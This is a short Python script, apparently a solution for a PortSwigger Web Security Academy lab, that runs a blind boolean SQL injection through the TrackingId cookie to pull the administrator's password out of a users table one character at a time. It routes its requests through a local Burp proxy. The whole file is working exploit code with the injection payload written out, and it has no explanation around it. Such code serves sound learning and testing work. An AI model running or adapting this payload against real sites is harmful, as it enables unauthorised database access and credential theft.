import requests
#进度条
from tqdm import tqdm
import warnings

#忽略waring
warnings.filterwarnings('ignore')

url='https://ac2b1f741f3daa9fc662dc7300f100d6.web-security-academy.net/filter?category=Gifts'
#打开代理，burp抓包
proxy = {
    'http': '127.0.0.1:8080',
    'https': '127.0.0.1:8080'
}

header={
    'User - Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0'

}

Cookie= {
    'TrackingId':"",
    'session':'Rlge45b8mBwrOnqczwxiEqQkUt5YEV7b'
}

print(header)
char=''
password=''
for j in tqdm(range(1,21)):
    for i in tqdm(range(0x30, 0x7e)):
        char = chr(i)
        # print(char.isalpha())
        # print(char.isnumeric())
        if char.isalpha() or char.isnumeric():
            Cookie['TrackingId'] = "W5QoBJL0FBEEkGd8'and (select substring(password,"+str(j)+",1) from users where username='administrator')='" + char + "'--"
            #print(char)
            r = requests.get(url=url, proxies=proxy, headers=header, verify=False, cookies=Cookie)
            # print(r.text)
            if "Welcome" in r.text:
                print("success")
                password+=char
                break

print(password)